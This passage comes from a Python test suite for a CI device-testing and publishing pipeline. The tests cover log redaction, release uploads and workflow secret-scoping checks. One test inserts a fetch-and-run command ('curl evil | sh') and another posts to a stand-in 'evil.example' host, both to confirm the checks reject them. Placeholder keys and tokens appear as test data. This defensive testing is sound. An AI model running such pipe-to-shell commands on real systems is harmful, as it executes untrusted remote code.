        self.assertEqual(data["results"][RUN]["android/sign-in"]["verdict"], "pass", "ui-pass from the report")
        self.assertIn("latest", data["results"])
        self.assertEqual(data["results"]["latest"]["android/sign-in"]["headline"], "Signs in")
        self.assertFalse(list((work / "device-tests").rglob("flows.json")), "may-app's files are never committed")

    def test_device_made_previews_are_checked_kept_apart_and_the_board_points_at_them(self):
        """Review of #88: previews come sealed from the device job; publish checks them and never decodes them."""
        flows = {"flows": [{"id": "2", "title": "Sign in and out", "scenarios": ["sign-in"], "components": []}]}
        try:
            self.open_with(self.GOOD + [(RUN + "/android/flows.json", json.dumps(flows).encode()),
                                        (RUN + "/android/sign-in" + device_tests.PREVIEW, MP4),
                                        (RUN + "/android/notes" + device_tests.PREVIEW, b"<html>not a video")])
        except publish.PublishError as error:
            self.fail(f"a bad preview stopped device-open: {error}")
        videos = self.root / "may-private" / publish.VIDEOS / RUN / "android"
        self.assertEqual(sorted(p.name for p in videos.iterdir()), ["sign-in.mp4", "sign-in.preview.mp4"],
                         "the bad preview is dropped, the good one set aside with the recordings, out of git")
        work, lines, _ = self.push_for_board()
        page = (work / "device-tests" / "board" / "index.html").read_text()
        data = json.loads(page.split('id="board-data">')[1].split("</script>")[0])
        self.assertEqual(data["results"][RUN]["android/sign-in"]["preview"], f"media/{RUN}/android-sign-in.preview.mp4")
        self.assertFalse(list((work / "device-tests").rglob("*.mp4")), "no video in may-renders' git")

    def test_android_diagnostics_are_checked_and_kept_apart_never_committed(self):
        try:
            self.open_with(self.GOOD + [(RUN + "/android/sign-in" + device_tests.DIAG, b'"main" prio=5 tid=1\n'),
                                        (RUN + "/android/chat" + device_tests.DIAG, b"Authorization: Bearer x\n"),
                                        (RUN + "/android/notes" + device_tests.DIAG, b"\xff\xfe")])
        except publish.PublishError as error:
            self.fail(f"a bad diagnostics file stopped device-open: {error}")
        tree = self.root / publish.TREE / RUN
        self.assertEqual(list(tree.rglob("*" + device_tests.DIAG)), [], "diagnostics never enter may-renders history")
        videos = self.root / "may-private" / publish.VIDEOS / RUN / "android"
        self.assertEqual(sorted(p.name for p in videos.iterdir()), ["sign-in.diag.txt", "sign-in.mp4"],
                         "a file with a secret-shaped line or not UTF-8 is dropped; the good one is set aside")

    def push_for_board(self):
        work = self.root / "may-publish-git"

        def git(argv, log, env, cwd, capture=False):
            if argv[0] == "init":
                Path(argv[-1]).mkdir()
            return b""

        key = "-----BEGIN OPENSSH PRIVATE KEY-----\n" + "A" * 120 + "\n-----END OPENSSH PRIVATE KEY-----"
        calls = []
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root), "MAY_APP_RENDERS_WRITE_KEY": key,
                                     "GITHUB_RUN_ID": "9"}, clear=True), \
                patch("sys.stdout", new_callable=io.StringIO) as out:
            publish.push_device(run_git=lambda argv, *a, **k: calls.append(argv) or git(argv, *a, **k))
        return work, out.getvalue().splitlines(), calls

    def test_a_malformed_may_app_board_file_never_stops_the_publish(self):
        """Review of #86: one trailing comma in board-notes.json raised in extract(), so nothing was published."""
        flows = {"flows": [{"id": "2", "title": "Sign in and out", "scenarios": ["sign-in"], "components": []}]}
        try:
            tree, _ = self.open_with(self.GOOD + [(RUN + "/android/flows.json", json.dumps(flows).encode()),
                                                  (RUN + "/android/board-notes.json", b'{"banner": {},}')])
        except publish.PublishError as error:
            self.fail(f"a malformed board-notes.json stopped device-open: {error}")
        self.assertTrue((tree / "README.md").is_file())
        work, lines, _ = self.push_for_board()
        # Re-review of #86: the log says the board went without the dropped notes.
        self.assertEqual(lines[-1], "May device tests: the flow board is device-tests/board/ in may-renders, without "
                                    "notes (may-app's board-notes.json is malformed)")
        self.assertTrue((work / "device-tests" / RUN / "android" / "sign-in-end.png").is_file())

    def test_deeply_nested_may_app_json_never_stops_the_publish(self):
        """Re-review of #86: 200,000 "[" raised RecursionError, which escaped extract() and stopped device-open."""
        try:
            self.assertFalse(publish.is_json(b"[" * 200000))
        except RecursionError:
            self.fail("deep nesting escaped is_json")
        try:
            tree, _ = self.open_with(self.GOOD + [(RUN + "/android/board-notes.json", b"[" * 200000),
                                                  (RUN + "/android/flows.json", b"{" * 200000)])
        except (publish.PublishError, RecursionError) as error:
            self.fail(f"deeply nested may-app JSON stopped device-open: {type(error).__name__}")
        self.assertTrue((tree / "README.md").is_file())

    def test_a_board_that_fails_never_costs_the_run_its_publishing(self):
        """Review of #86: any error in the board skips the board alone."""
        self.open_with(self.GOOD)
        with patch("board.update", side_effect=IndexError("month 13")):
            try:
                work, lines, calls = self.push_for_board()
            except IndexError:
                self.fail("a board error stopped device-push")
        self.assertEqual(lines[-1], "May device tests: no flow board (it could not be built; the run is published)")
        self.assertIn(["push", "--quiet", "origin", "HEAD:refs/heads/main"], calls)
        self.assertTrue((work / "device-tests" / RUN / "README.md").is_file())

    def test_nothing_sealed_publishes_nothing(self):
        (self.root / publish.DEVICE_DOWNLOAD / "android.age").unlink()
        with patch.dict(os.environ, {"RUNNER_TEMP": str(self.root)}, clear=True), \
                patch("sys.stdout", new_callable=io.StringIO) as out:
            publish.open_device()
            publish.push_device(run_git=lambda *a, **k: self.fail("git ran"))
        self.assertEqual(out.getvalue().splitlines(), [
            "May device tests: no sealed report from this run attempt; nothing will be published",
            "May device tests: nothing was decrypted, so nothing was pushed"])



def dropbox(*entries, tag="data_app_anr"):
    sep = b"=" * 40 + b"\n"
    return b"Drop box contents: %d entries\n" % len(entries) + b"".join(
        sep + b"2026-10-24 17:%02d:00 " % i + tag.encode() + b" (text, 100 bytes)\n" + body + b"\n"
        for i, body in enumerate(entries))


class FakeEmulator:
    """adb as Diagnostics and settle_boot see it: dropbox entries, a log, and every call."""

    def __init__(self, anrs=(), crashes=(), log=b"", fail=False):
        self.anrs, self.crashes, self.log, self.fail, self.calls = list(anrs), list(crashes), log, fail, []

    def __call__(self, argv, **kwargs):
        self.calls.append(argv[1:])
        if self.fail:
            raise subprocess.TimeoutExpired(argv, 60)
        out = b""
        if argv[1:5] == ["shell", "dumpsys", "dropbox", "--print"]:
            out = dropbox(*self.anrs) if argv[5] == "data_app_anr" else dropbox(*self.crashes, tag="data_app_crash")
        elif argv[1:3] == ["logcat", "-d"]:
            out = self.log
        return subprocess.CompletedProcess(argv, 0, out, b"")


class DiagnosticsTests(unittest.TestCase):
    """Coordinator, 24 Oct: sign-out's recording showed "May Playground isn't responding"; M needs its stack."""

    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.folder = Path(self.directory.name)

    def tearDown(self):
        self.directory.cleanup()

    def test_each_scenario_keeps_its_own_anr_and_log_and_no_line_that_could_carry_the_session(self):
        jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ0ZXN0In0.c2ln"
        emulator = FakeEmulator(anrs=[b"old ANR from before the run"])
        with patch("device_tests.subprocess.run", side_effect=emulator):
            diagnostics = device_tests.Diagnostics("/sdk/adb", {})
            emulator.anrs.append(b'Subject: Input dispatching timed out\n"main" prio=5 tid=1 Blocked\n  at MainActivity')
            emulator.log = ("I/ActivityManager: Start proc\n"
                            f"D/OkHttp: Authorization: Bearer {TOKEN}\n"
                            f"D/May: session {TOKEN}\n"
                            f"D/May: token {jwt}\n"
                            "I/am: may_test_session extra\n"
                            "E/ActivityManager: ANR in io.github.mayassistant.may.playground\n").encode()
            diagnostics.keep(self.folder, "sign-out", TOKEN)
            emulator.log = b"I/May: next scenario\n"
            diagnostics.keep(self.folder, "connections", TOKEN)
        text = (self.folder / "sign-out.diag.txt").read_text()
        self.assertIn('"main" prio=5 tid=1 Blocked', text)
        self.assertIn("ANR in io.github.mayassistant.may.playground", text)
        self.assertNotIn("old ANR from before the run", text, "an entry already there belongs to no scenario")
        for secret in (TOKEN, jwt, "Authorization", "may_test_session"):
            self.assertNotIn(secret, text)
        later = (self.folder / "connections.diag.txt").read_text()
        self.assertNotIn("Input dispatching", later, "each ANR is kept once, with its own scenario")
        self.assertIn("next scenario", later)
        self.assertEqual((diagnostics.kept, diagnostics.anrs, diagnostics.crashes), (2, 1, 0))
        dumps = [i for i, argv in enumerate(emulator.calls) if argv[:2] == ["logcat", "-d"]]
        clears = [i for i, argv in enumerate(emulator.calls) if argv[-1:] == ["-c"]]
        self.assertEqual(len(clears), 2)
        self.assertTrue(all(dump < clear for dump, clear in zip(dumps, clears)), "the log is cleared once read")
        self.assertIn(["logcat", "-d", "-t", "2000", "-b", "main,system,crash"], emulator.calls)

    def test_a_file_stays_within_its_size_with_the_stacks_and_the_newest_log_lines(self):
        emulator = FakeEmulator(crashes=[])
        with patch("device_tests.subprocess.run", side_effect=emulator):
            diagnostics = device_tests.Diagnostics("/sdk/adb", {})
            emulator.crashes.append(b'"main" crashed\n' + b"x" * (device_tests.MAX_DIAG * 2))
            emulator.log = b"".join(b"I/May: line %06d\n" % n for n in range(60000)) + b"I/May: the newest line\n"
            diagnostics.keep(self.folder, "chat", "")
        data = (self.folder / "chat.diag.txt").read_bytes()
        self.assertLessEqual(len(data), device_tests.MAX_DIAG)
        self.assertIn(b'"main" crashed', data)
        self.assertTrue(data.endswith(b"I/May: the newest line\n"))
        self.assertEqual(diagnostics.crashes, 1)

    def test_stray_bytes_never_take_a_file_over_its_size(self):
        emulator = FakeEmulator(log=b"I/May: \xff\xfe\n" * (device_tests.MAX_DIAG // 8))
        with patch("device_tests.subprocess.run", side_effect=emulator):
            device_tests.Diagnostics("/sdk/adb", {}).keep(self.folder, "chat", "")
        data = (self.folder / "chat.diag.txt").read_bytes()
        self.assertLessEqual(len(data), device_tests.MAX_DIAG, "each stray byte becomes three once replaced")
        data.decode("utf-8")

    def test_an_emulator_that_does_not_answer_never_stops_the_run(self):
        with patch("device_tests.subprocess.run", side_effect=FakeEmulator(fail=True)):
            diagnostics = device_tests.Diagnostics("/sdk/adb", {})
            diagnostics.keep(self.folder, "sign-in", TOKEN)
        self.assertEqual(list(self.folder.iterdir()), [])
        self.assertEqual(diagnostics.kept, 0)

    def test_the_emulator_settles_before_the_app_is_installed(self):
        now, sleeps, answers = [0], [], iter([b"\n", b"9.10 4.00 1.00 3/400 99\n", b"1\n", b"3.50 2.00 1.00 3/400 99\n",
                                               b"1\n", b"1.20 2.00 1.00 3/400 99\n"])

        def run(argv, **kwargs):
            return subprocess.CompletedProcess(argv, 0, next(answers), b"")

        log = self.folder / "log"
        with patch("device_tests.subprocess.run", side_effect=run):
            settled = device_tests.settle_boot("/sdk/adb", {}, log, clock=lambda: now[0],
                                               sleep=lambda seconds: sleeps.append(seconds) or now.__setitem__(0, now[0] + seconds))
        self.assertTrue(settled)
        self.assertEqual(sleeps, [5, 5], "dev.bootcomplete first, then a load average under SETTLE_LOAD")
        self.assertEqual(log.read_bytes(), b"emulator settled\n")

    def test_an_emulator_that_never_settles_still_runs_after_the_ceiling(self):
        now = [0]

        def run(argv, **kwargs):
            return subprocess.CompletedProcess(argv, 0, b"1\n" if "getprop" in argv else b"8.00 8.00 8.00 3/400 99\n",
                                               b"")

        log = self.folder / "log"
        with patch("device_tests.subprocess.run", side_effect=run):
            settled = device_tests.settle_boot("/sdk/adb", {}, log, clock=lambda: now[0],
                                               sleep=lambda seconds: now.__setitem__(0, now[0] + seconds))
        self.assertFalse(settled)
        self.assertEqual(now[0], device_tests.SETTLE_SECONDS)
        self.assertEqual(log.read_bytes(), b"emulator did not settle; going on\n")

    def test_boot_settles_the_emulator_before_returning(self):
        with patch("device_tests.settle_boot") as settle, \
                patch("device_tests.flows.sdk", return_value=Path("/sdk")), \
                patch("device_tests.flows.sdk_tool", side_effect=lambda home, tool: str(home / tool)), \
                patch("device_tests.subprocess.run", return_value=subprocess.CompletedProcess([], 0, b"1\n")), \
                patch("device_tests.subprocess.Popen"), patch("device_tests.flows.run_private", return_value=0):
            device_tests.boot(self.folder, self.folder / "log")
        self.assertEqual(settle.call_count, 1)

    def test_a_secret_shaped_line_or_an_oversized_or_binary_file_is_dropped_at_publish(self):
        self.assertTrue(publish.diagnostics_ok(b'"main" prio=5\n'))
        self.assertFalse(publish.diagnostics_ok(b"Authorization: Bearer abc\n"))
        self.assertFalse(publish.diagnostics_ok(b"\xff\xfe"))
        self.assertFalse(publish.diagnostics_ok(b"x" * (device_tests.MAX_DIAG + 1)))


class FakeRenders:
    """may-renders' release API as device-release sees it, recording every call."""

    def __init__(self, existing=(), create=201, assets=(), upload=201, failing=()):
        self.calls, self.existing, self.create, self.assets, self.upload = [], list(existing), create, list(assets), upload
        self.failing = set(failing)

    def __call__(self, method, host, path, token, payload=None, data=None):
        self.calls.append((method, host, path, payload, data))
        base = "/repos/May-Assistant/may-renders"
        if method == "POST" and path == base + "/releases":
            return self.create, ({"id": 77} if self.create == 201 else None)
        if method == "GET" and path.startswith(base + "/releases/tags/"):
            return 200, {"id": 77}
        if method == "GET" and path == base + "/releases/77/assets?per_page=100":
            return 200, [{"name": name} for name in self.assets]
        if method == "POST" and host == publish.UPLOADS:
            return (500 if path.rsplit("=", 1)[1] in self.failing else self.upload), {}
        if method == "GET" and path == base + "/releases?per_page=100":
            return 200, self.existing
        if method == "DELETE":
            return 204, None
        raise AssertionError("unexpected call " + method + " " + path)


class ReleaseDeviceTests(unittest.TestCase):
    TOKEN = "github_pat_" + "x" * 30

    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.root = Path(self.directory.name)
        self.videos = self.root / "may-private" / publish.VIDEOS / RUN / "android"
        self.videos.mkdir(parents=True)
        for name in ("sign-in.mp4", "connections-part1.mp4", "connections-part2.mp4"):
            (self.videos / name).write_bytes(MP4)

    def tearDown(self):
        self.directory.cleanup()

    def release(self, api, token=TOKEN):
        environ = {"RUNNER_TEMP": str(self.root)}
        if token is not None:
            environ["MAY_RENDERS_RELEASE_TOKEN"] = token
        with patch.dict(os.environ, environ, clear=True), patch("sys.stdout", new_callable=io.StringIO) as out:
            publish.release_device(api=api)
            self.assertNotIn("MAY_RENDERS_RELEASE_TOKEN", os.environ)
        return out.getvalue().strip()

    def test_uploads_each_recording_to_this_runs_release_and_keeps_ten(self):
        existing = [{"id": n, "tag_name": "device-tests-202610%02d-%012x" % (n, n), "created_at": "x"}
                    for n in range(1, 12)] + [{"id": 500, "tag_name": "v1.0"}]
        api = FakeRenders(existing=existing)
        self.assertEqual(self.release(api), f"May device tests: 3 recordings, 0 previews and 0 diagnostics uploaded to "
                                            f"the may-renders release for device-tests/{RUN}/ (10 releases kept, 1 "
                                            "removed)")
        create = api.calls[0]
        self.assertEqual(create[:3], ("POST", publish.API, "/repos/May-Assistant/may-renders/releases"))
        self.assertEqual((create[3]["tag_name"], create[3]["target_commitish"], create[3]["make_latest"]),
                         ("device-tests-" + RUN, "main", "false"))
        uploads = [c for c in api.calls if c[1] == publish.UPLOADS]
        self.assertEqual([c[2].rsplit("=", 1)[1] for c in uploads],
                         ["android-connections-part1.mp4", "android-connections-part2.mp4", "android-sign-in.mp4"])
        self.assertTrue(all(c[4] == MP4 for c in uploads))
        deleted = [c[2] for c in api.calls if c[0] == "DELETE"]
        self.assertEqual(deleted, ["/repos/May-Assistant/may-renders/releases/1",
                                   "/repos/May-Assistant/may-renders/git/refs/tags/device-tests-20261001-000000000001"],
                         "only the oldest device-tests release goes; other releases are never touched")

    def test_recordings_go_up_first_and_a_preview_that_fails_never_costs_them(self):
        """Review of #88: "x-preview.mp4" sorted before "x.mp4", and a failed preview upload aborted the recordings."""
        (self.videos / ("sign-in" + device_tests.PREVIEW)).write_bytes(MP4)
        (self.videos / ("connections" + device_tests.PREVIEW)).write_bytes(MP4)
        api = FakeRenders(failing=["android-connections.preview.mp4"])
        try:
            out = self.release(api)
        except publish.PublishError as error:
            self.fail(f"a preview upload failure stopped the release: {error}")
        names = [c[2].rsplit("=", 1)[1] for c in api.calls if c[1] == publish.UPLOADS]
        self.assertEqual(names[:3], ["android-connections-part1.mp4", "android-connections-part2.mp4",
                                     "android-sign-in.mp4"], "every recording before any preview")
        self.assertEqual(sorted(names[3:]), ["android-connections.preview.mp4", "android-sign-in.preview.mp4"])
        self.assertIn("3 recordings, 1 previews and 0 diagnostics uploaded", out, "previews are never counted as recordings")
        with self.assertRaises(publish.PublishError):
            self.release(FakeRenders(failing=["android-sign-in.mp4"]))

    def test_a_network_error_on_a_preview_never_skips_the_rest_or_the_pruning(self):
        """Re-review of #88: a reset connection or a short read on a preview propagated past prune_releases."""
        (self.videos / ("sign-in" + device_tests.PREVIEW)).write_bytes(MP4)
        (self.videos / ("connections" + device_tests.PREVIEW)).write_bytes(MP4)
        api = FakeRenders()

        def flaky(method, host, path, token, payload=None, data=None):
            if path.endswith("android-connections.preview.mp4"):
                raise http.client.IncompleteRead(b"")
            if path.endswith("android-sign-in.preview.mp4"):
                raise ConnectionResetError(104, "reset")
            return api(method, host, path, token, payload, data)

        try:
            out = self.release(flaky)
        except (OSError, http.client.HTTPException) as error:
            self.fail(f"a preview's network error stopped the release: {type(error).__name__}")
        self.assertIn("3 recordings, 0 previews and 0 diagnostics uploaded", out)
        self.assertIn("GET", [c[0] for c in api.calls if c[2].endswith("/releases?per_page=100")],
                      "the pruning still ran")

    def test_the_longest_scenario_ids_preview_is_a_file_and_an_asset_the_release_accepts(self):
        """Review of #88: a long id made "<id>-preview.mp4" too long for DEVICE_FILE, so it never uploaded."""
        longest = "s" * 48
        self.assertTrue(publish.DEVICE_FILE.fullmatch(longest + device_tests.PREVIEW))
        upload = next(pattern for method, host, pattern in publish.RELEASE_CALLS if host == publish.UPLOADS)
        self.assertTrue(re.fullmatch(upload, "/repos/May-Assistant/may-renders/releases/77/assets?name=" +
                                     publish.asset_name("ios", longest + device_tests.PREVIEW)))

    def test_diagnostics_go_up_after_the_recordings_and_a_failed_one_never_costs_them(self):
        (self.videos / ("sign-in" + device_tests.DIAG)).write_text('"main" prio=5\n')
        (self.videos / ("connections" + device_tests.DIAG)).write_text("log\n")
        api = FakeRenders(failing=["android-connections.diag.txt"])
        try:
            out = self.release(api)
        except publish.PublishError as error:
            self.fail(f"a diagnostics upload failure stopped the release: {error}")
        names = [c[2].rsplit("=", 1)[1] for c in api.calls if c[1] == publish.UPLOADS]
        self.assertEqual(names[:3], ["android-connections-part1.mp4", "android-connections-part2.mp4",
                                     "android-sign-in.mp4"], "every recording first")
        self.assertEqual(sorted(names[3:]), ["android-connections.diag.txt", "android-sign-in.diag.txt"])
        self.assertIn("3 recordings, 0 previews and 1 diagnostics uploaded", out)

    def test_a_diagnostics_asset_is_sent_as_text(self):
        sent = []

        class Reply(io.BytesIO):
            status = 201

            def __enter__(self):
                return self

            def __exit__(self, *exc):
                return False

        def urlopen(request, timeout):
            sent.append(request)
            return Reply(b"{}")

        path = "/repos/May-Assistant/may-renders/releases/77/assets?name=android-sign-in.diag.txt"
        with patch("publish.urllib.request.urlopen", side_effect=urlopen):
            self.assertEqual(publish.renders_api("POST", publish.UPLOADS, path, TOKEN, data=b"x")[0], 201)
            publish.renders_api("POST", publish.UPLOADS, path.replace(".diag.txt", ".mp4"), TOKEN, data=MP4)
        self.assertEqual([r.get_header("Content-type") for r in sent], ["text/plain; charset=utf-8", "video/mp4"])
        with self.assertRaises(PublishError):
            publish.renders_api("POST", publish.UPLOADS, path.replace(".diag.txt", ".txt"), TOKEN, data=b"x")

    def test_a_re_run_reuses_the_release_and_skips_assets_already_there(self):
        api = FakeRenders(create=422, assets=["android-sign-in.mp4"])
        self.assertIn("2 recordings, 0 previews and 0 diagnostics uploaded", self.release(api))
        self.assertIn(("GET", publish.API, f"/repos/May-Assistant/may-renders/releases/tags/device-tests-{RUN}", None,
                       None), api.calls)

    def test_a_failed_upload_stops_the_step(self):
        with self.assertRaises(PublishError):
            self.release(FakeRenders(upload=500))

    def test_without_the_token_or_recordings_nothing_is_called(self):
        def refuse(*args, **kwargs):
            raise AssertionError("called may-renders")

        self.assertEqual(self.release(refuse, token=None), "May device tests: MAY_RENDERS_RELEASE_TOKEN is not set in "
                                                           "may-device-tests; recordings stay only in the encrypted artifact")
        shutil.rmtree(self.root / "may-private")
        self.assertEqual(self.release(refuse), "May device tests: no recordings were decrypted, so none were uploaded")

    def test_only_may_renders_device_tests_releases_are_reachable(self):
        for method, host, path in (("GET", publish.API, "/repos/May-Assistant/may-app/releases?per_page=100"),
                                   ("DELETE", publish.API, "/repos/May-Assistant/may-renders/git/refs/heads/main"),
                                   ("DELETE", publish.API, "/repos/May-Assistant/may-renders/git/refs/tags/v1.0"),
                                   ("POST", "https://evil.example", "/repos/May-Assistant/may-renders/releases"),
                                   ("POST", publish.UPLOADS, "/repos/May-Assistant/may-renders/releases/7/assets?name=x.sh")):
            with self.subTest(path=path), patch("urllib.request.urlopen", side_effect=AssertionError("network")), \
                    self.assertRaises(PublishError):
                publish.renders_api(method, host, path, self.TOKEN)


class WorkflowPinTests(unittest.TestCase):
    def setUp(self):
        self.text = (ROOT / WORKFLOW).read_text()

    def flagged(self, text, message):
        problems = static_check.device_tests_workflow_problems(text)
        self.assertTrue(any(message in p for p in problems), problems)

    def test_the_committed_workflow_and_tool_pass(self):
        self.assertEqual(static_check.device_tests_workflow_problems(self.text), [])
        self.assertEqual(static_check.device_tests_print_problems(ROOT), [])

    def test_the_sign_in_secret_stays_in_the_scenarios_step(self):
        line = "          MAY_TEST_SIGNIN_SECRET: ${{ secrets.MAY_TEST_SIGNIN_SECRET }}\n"
        step = "      - name: Encrypt the report to the renders public key\n        env:\n"
        self.assertEqual((self.text.count(step), self.text.count(line)), (2, 2), "one of each per device job")
        self.flagged(self.text.replace(line, "", 1).replace(step, step + line, 1), "a secret, variable or env entry")
        self.flagged(self.text.replace(line, "", 2).replace(step, step + line), "a secret, variable or env entry")
        build = "      - name: Build May Playground for the emulator without secrets\n"
        self.flagged(self.text.replace(build, build + "        env:\n" + line.replace("MAY_TEST", "MAY_TEST", 1)),
                     "a secret, variable or env entry")

    def test_the_release_token_stays_in_the_release_step(self):
        line = "          MAY_RENDERS_RELEASE_TOKEN: ${{ steps.renders-release.outputs.token || secrets.MAY_RENDERS_RELEASE_TOKEN }}\n"
        push = "          MAY_APP_RENDERS_WRITE_KEY: ${{ secrets.MAY_APP_RENDERS_WRITE_KEY }}\n"
        self.assertEqual(self.text.count(line), 1)
        self.flagged(self.text.replace(line, "").replace(push, push + line), "a secret, variable or env entry")
        self.flagged(self.text.replace("publish.py device-release", "publish.py device-push"), "runs something other")

    def test_the_claude_token_and_model_stay_in_the_agent_and_judge_steps(self):
        line = "          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}\n"
        model = "          MAY_DEVICE_TESTS_MODEL: ${{ vars.MAY_DEVICE_TESTS_MODEL }}\n"
        judge = "      - name: Judge the agent scenarios\n        env:\n"
        seal = "      - name: Encrypt the report to the renders public key\n        env:\n"
        self.assertEqual((self.text.count(line), self.text.count(model), self.text.count(judge)), (4, 4, 2))
        moved = self.text.replace(judge + line, judge, 1).replace(seal, seal + line, 1)
        self.flagged(moved, "a secret, variable or env entry")
        self.flagged(self.text.replace(judge + line + model, judge + line, 1).replace(seal, seal + model, 1),
                     "a secret, variable or env entry")
        self.flagged(self.text.replace(judge + line + model, judge + line).replace(seal, seal + model),
                     "a secret, variable or env entry")
        self.flagged(self.text.replace(model, "", 1).replace(seal, seal + model), "a secret, variable or env entry")
        ios = self.text.index("\n  ios:\n")
        head, tail = self.text[:ios], self.text[ios:]
        self.flagged(head + tail.replace(judge + line + model, judge + line).replace(seal, seal + model),
                     "a secret, variable or env entry")
        self.flagged(self.text.replace(line, "", 1), "a secret, variable or env entry")
        self.flagged(self.text.replace("device_tests.py judge", "device_tests.py seal"), "runs something other")

    def test_variables_stay_in_their_steps(self):
        line = "          MAY_STAGING_API_URL: ${{ vars.MAY_STAGING_API_URL }}\n"
        build = "      - name: Build May Playground for the emulator without secrets\n"
        self.assertEqual(self.text.count(line), 2)
        self.flagged(self.text.replace(line, "", 1).replace(build, build + "        env:\n" + line),
                     "a secret, variable or env entry")

    def test_the_ios_job_holds_the_claude_token_in_its_agent_and_judge_steps_alone(self):
        ios = self.text.partition("\n  ios:\n")[2].partition("\n  publish:\n")[0]
        token = "          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}\n"
        build = "      - name: Build May Playground for the simulator without secrets\n"
        self.assertEqual(ios.count(token), 2)
        self.flagged(self.text.replace(build, build + "        env:\n" + token), "a secret, variable or env entry")
        ios_judge = ios.partition("      - name: Judge the agent scenarios\n        env:\n")[2].partition("        run:")[0]
        self.flagged(self.text.replace("      - name: Judge the agent scenarios\n        env:\n" + ios_judge +
                                       "        run: python3 -I -S -B tools/may_release/device_tests.py judge --platform ios",
                                       "      - name: Judge the agent scenarios\n        env:\n" +
                                       ios_judge.replace(token, "") +
                                       "        run: python3 -I -S -B tools/may_release/device_tests.py judge --platform ios"),
                     "a secret, variable or env entry")
        self.flagged(self.text.replace("may-device-sealed/ios.age", "may-device-out"), "hands over something")
        self.flagged(self.text.replace("name: may-device-ios-${{ github.run_attempt }}\n          path: "
                                       "${{ runner.temp }}/may-device-download", "name: x\n          path: "
                                       "${{ runner.temp }}/may-device-download"), "hands over something")
        self.flagged(self.text.replace("    needs: [admission, android, ios]\n", "    needs: [admission, android]\n"),
                     "after both")
        self.flagged(self.text.replace("    runs-on: macos-15\n", "    runs-on: macos-latest\n"), "on macOS")

    def test_only_the_encrypted_report_and_the_nightly_schedule(self):
        self.flagged(self.text.replace("may-device-sealed/android.age", "may-device-out"), "hands over something")
        self.flagged(self.text.replace('"17 3 * * *"', '"*/5 * * * *"'), "one nightly schedule")
        self.flagged(self.text.replace("sudo udevadm trigger --name-match=kvm", "curl evil | sh"), "runs something other")

    def test_static_check_runs_it(self):
        with tempfile.TemporaryDirectory() as directory:
            copy = Path(directory)
            shutil.copytree(ROOT / ".github", copy / ".github")
            shutil.copytree(ROOT / "tools", copy / "tools", ignore=shutil.ignore_patterns("__pycache__"))
            path = copy / WORKFLOW
            self.assertIn(f"retention-days: {publish.VIDEO_DAYS}\n", path.read_text(), "the README names this retention")
            path.write_text(path.read_text().replace("retention-days: 7\n", "retention-days: 5\n"))
            self.assertTrue(any(p.startswith("device-tests.yml: hands over") for p in static_check.problems(copy)))


class SecretNameTests(unittest.TestCase):
    def test_the_sign_in_secret_is_refused_by_every_other_step(self):
        self.assertIn("MAY_TEST_SIGNIN_SECRET", store.SECRET_NAMES)
        with patch.dict(os.environ, {"MAY_TEST_SIGNIN_SECRET": "x"}, clear=True), self.assertRaises(store.StoreError):
            store.require_step_secrets(store.SOURCE_READ_SECRETS)

    def test_the_release_token_is_refused_by_every_other_step(self):
        self.assertIn("MAY_RENDERS_RELEASE_TOKEN", store.SECRET_NAMES)
        with patch.dict(os.environ, {"MAY_RENDERS_RELEASE_TOKEN": "x"}, clear=True), self.assertRaises(store.StoreError):
            store.require_step_secrets(("MAY_APP_RENDERS_WRITE_KEY",))


if __name__ == "__main__":
    unittest.main()
